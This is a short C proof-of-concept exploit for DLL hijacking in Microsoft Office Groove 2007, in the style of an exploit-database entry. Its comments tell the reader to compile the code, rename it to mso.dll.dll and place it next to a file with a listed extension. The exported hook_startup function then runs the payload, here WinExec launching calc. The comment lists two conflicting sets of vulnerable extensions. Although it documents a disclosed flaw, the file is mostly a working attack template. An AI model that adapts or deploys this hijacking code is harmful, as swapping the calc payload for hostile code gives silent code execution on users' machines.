/* 
# Greetz to :b0nd, Fbih2s,r45c4l,Charles ,j4ckh4x0r, punter,eberly, Charles , Dinesh Arora, Anirban ,Ganesha, Dinesh Arora
# Site : www.beenuarora.com

Exploit Title: Microsoft Office Groove 2007 DLL Hijacking 
Date: 25/08/2010
Author: Beenu Arora
Tested on: Windows XP SP3 , Microsoft Office Groove 2007
Vulnerable extensions: wab , p7c

Compile and rename to mso.dll.dll, create a file in the same dir with one of the following extensions:
.vcg , .gta
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void hook_startup() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}

// POC: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/14746.zip